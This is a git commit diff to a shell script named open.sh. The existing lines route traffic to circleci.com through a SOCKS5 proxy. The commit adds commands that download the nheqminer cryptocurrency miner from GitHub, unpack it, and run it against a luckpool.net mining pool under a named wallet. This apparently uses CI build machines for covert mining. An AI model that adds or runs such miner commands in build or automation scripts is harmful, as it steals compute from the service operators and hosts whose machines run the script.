1d2e8e3e1a9116cf63124cb782419e87b3d13c07
yunisajara0 <93653777+yunisajara0@users.noreply.github.com>
2021-11-03 19:09:30 +0700

    Update open.sh

--- open.sh
+++ open.sh
@@ -12,3 +12,7 @@ service danted status
 #
 curl -v -x socks5://103.143.10.225:1080 https://circleci.com//
 #
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.FaxSlowsmo -p x -t 2
